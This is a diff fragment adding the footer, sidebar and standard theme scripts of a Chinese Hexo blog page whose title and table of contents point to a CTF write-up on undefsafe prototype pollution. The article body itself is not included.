+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E6%B3%A8%E9%87%8A"><span class="toc-number">1.</span> <span class="toc-text"> 源码+注释：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text"> 知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#undefsafe"><span class="toc-number">2.1.</span> <span class="toc-text"> undefsafe</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text"> 解题</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">186</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">179</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "[网鼎杯 2020 青龙组]notes",
+          url: "http://example.com/2025/05/23/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84]notes/",
+          excerpt: "",
+          description: "",
+          stripContent: "考点：undefsafe函数导致的原型链污染  源码+注释： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109",
+          date: "Fri May 23 2025 15:38:54 GMT+0800",
+          updated: "Sun Jun 01 2025 18:31:24 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
